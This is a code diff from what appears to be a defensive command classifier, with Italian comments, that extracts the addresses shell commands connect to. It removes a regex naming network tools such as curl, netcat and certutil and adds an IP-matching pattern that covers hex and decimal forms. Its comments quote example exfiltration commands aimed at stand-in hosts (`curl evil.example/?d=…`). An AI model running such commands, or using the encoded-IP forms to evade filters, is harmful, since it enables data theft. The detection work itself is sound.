@@ -831,8 +831,10 @@
   }
 
   // Gli indirizzi a cui un comando si collega (#2293): quelli con lo schema ovunque, e quelli senza (`curl evil.example/?d=…`,
-  // `nslookup dati.evil.example`) dietro un programma di rete. Le shell tolgono `^`, virgolette e backtick (#1072.1).
-  const PROGRAMMI_RETE = /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|aria2c|lynx|w3m|links|nc|ncat|netcat|telnet|ssh|scp|sftp|ftp|rsync|http|https|xh|ping|nslookup|dig|host|resolve-dnsname|test-netconnection|start-bitstransfer|certutil|bitsadmin)\b/i;
+  // `nslookup dati.evil.example`, `curl 203.0.113.5/?d=…`) dietro un programma di rete, che elenca cmdClassify; senza
+  // l'elenco si guarda ogni parola. Le shell tolgono `^`, virgolette e backtick (#1072.1).
+  // Un indirizzo IP anche in una cifra sola (`0xcb007105`, `3405803781`: curl li apre), o fra quadre.
+  const IP = /^(?:\d{1,3}(?:\.\d{1,3}){3}|0x[0-9a-f]{7,8}|\d{8,10}|\[[0-9a-f:.]+\])(:\d{1,5})?([/?#].*)?$/i;
   const ESTENSIONI = /^(?:gz|tgz|bz2|xz|zip|tar|7z|rar|json|txt|md|log|csv|xml|html?|js|mjs|ts|py|sh|ps1|bat|exe|msi|dmg|deb|rpm|pdf|png|jpe?g|gif|iso|conf|ini|ya?ml|toml)$/i;
   const MAX_INDIRIZZI_COMANDO = 50;
   function indirizziDelComando(action) {
